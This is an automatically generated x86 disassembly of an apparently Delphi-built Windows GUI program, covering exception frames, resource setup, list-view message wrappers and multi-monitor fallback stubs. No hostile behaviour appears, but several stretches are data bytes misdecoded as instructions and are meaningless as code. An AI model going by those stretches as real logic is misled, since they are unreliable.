push ebp
push sub_42bb01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb08
mov eax [ ebp - 0x4 ]
call sub_42ba54
retn
mov eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42bb14
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42bb14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42bbf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_429e14
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424d8c
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424c70
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417298
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4250a4
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_425504
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_429ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bc14
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42ba48
xor eax eax
push ebp
push sub_42bc5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc66
mov eax [ ebp - 0x4 ]
call sub_42ba54
retn
mov esp ebp
pop ebp
retn
sub_42bc66
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42ba48
xor eax eax
push ebp
push sub_42bc5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc66
mov eax [ ebp - 0x4 ]
call sub_42ba54
retn
mov esp ebp
pop ebp
retn
sub_42bc8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423fe4
push eax
mov eax ebx
call sub_423fe4
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42ba60
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42bcc4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bd8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd94
retn
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
call sub_428a88
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404aec
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404aec
sub_42bd98
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b89c
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42b918
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42379c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_42379c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_42379c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b9e4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b7c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b7c
mov [ rw-data ] eax
mov ecx sub_423ff4
mov edx sub_424004
mov eax [ sub_422680 ]
call sub_418094
mov ecx r-xdata
mov edx sub_42420c
mov eax [ r-xdata ]
call sub_418094
sub_42bea4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bec9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bed0
retn
sub_42bee0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x140042 ] bh
add [ eax ] al
cmp [ eax + 0x41 ] ah
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x79 ] bl
inc ecx
add ah bh
mov [ ecx ] al
cmp cl al
inc edx
add [ edi + eax * 4 - 0x77d7ffbf ] ch
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al al
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x57ffbd3d ] ah
sub al [ eax ]
in al 0xc3
inc edx
add al dl
retn
nop
mov edi 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x180042bf ]
add [ eax ] al
add ah bl
mov esi 0x34f00042
inc eax
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx + eax * 8 + 0x42 ] ah
add ah bh
mov [ ecx ] al
int3
sub_42bf98
lodsb [ esi ]
xchg [ ecx ] eax
sub [ eax + 0x540e0041 ] cl
inc ebx
outsd
insd
jo r-xdata
inc eax
add [ eax + eax * 8 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x40 ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0xfffbd41 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x40042c3 ] ah
les eax [ edx ]
in al 0xc3
inc edx
add al dl
retn
outsb
outsb
je r-xdata
mov al [ 0xffffffffa80042c3 ]
sub al [ eax ]
in al 0xc3
inc edx
add al dl
retn
imul esi [ ebx + 0x74 ] 0x42bffc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
rol [ edx ] 0x8
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x57ffbd3d ] ah
sub_42c006
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
ror [ ebx + 0x719ae8c6 ] cl
std
dec [ eax - 0x3974efa2 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x6400408d
rol [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x40 ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0xfffbd41 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x40042c3 ] ah
les eax [ edx ]
in al 0xc3
inc edx
add al dl
retn
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c06e
inc edx
add [ esi ] al
push esp
push ebx
je r-xdata
ror [ ebx + 0x719ae8c6 ] cl
std
dec [ eax - 0x3974efa2 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c080
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c0bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov [ esi + 0x10 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c138
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418b78
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4032a8
sub_42c200
pop es
adc edx [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
ffree st4
outsb
outsb
je r-xdata
retn
imul esi [ ebx + 0x74 ] 0x7578654e
jae r-xdata
inc edx
add [ eax - 0x1bffbdec ] ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0xf ] cl
inc edx
add [ ebx ] dl
push esp
inc ebx
outsd
insd
jo r-xdata
rol [ edx ] 0x80
jo r-xdata
outsb
outsb
je r-xdata
pop ss
add [ edx ] al
add [ edi ] al
inc ebx
outsd
outsb
je r-xdata
or cl [ ebx - 0x74297431 ]
inc esi
xor al 0xff
push esi
xor [ ebx - 0x74287435 ] cl
imul esi [ ebx + 0x74 ] 0x7578654e
jae r-xdata
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
jb r-xdata
retn 0x42
mov edx esi
mov eax ebx
call sub_42c100
pop esi
pop ebx
retn
add [ eax ] al
lea eax [ eax ]
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp bl 0x1
jne r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_421264
pop edi
pop esi
pop ebx
cmp [ esi + 0x32 ] 0x0
je r-xdata
mov ecx edi
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
sub_42c264
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418758
mov eax [ esi + 0x14 ]
call sub_4032a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42c2cc
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax ebx
sub al 0x1
jb r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ sub_42c16c ]
call sub_420f48
mov ebp eax
mov [ edi + 0x14 ] ebp
mov [ ebp + 0x34 ] edi
mov [ ebp + 0x30 ] sub_42c2bc
test esi esi
je r-xdata
sub al 0x2
jb r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_42c138
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x14 ]
mov eax esi
call sub_421018
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x14 ]
mov eax esi
call sub_421248
sub_42c35c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42c3a0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42c3e4
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4187c4
mov eax esi
pop esi
pop ebx
retn
sub_42c410
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c435
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c43c
retn
sub_42c450
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42c4b0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42c450
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42c618
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c634
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c650
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406c90
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c674
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42c6a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42c6d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c6f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c715
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c71c
retn
sub_42c728
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_42c7e7
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7ee
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42c728
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
sub_42c810
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42c728
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42c898
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42c728
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42c928
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42c728
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42c898
sub_42c9be
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42c728
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42ca3f
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42c728
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42cb2c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42c728
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42cc00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42c728
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ccd4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42c728
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
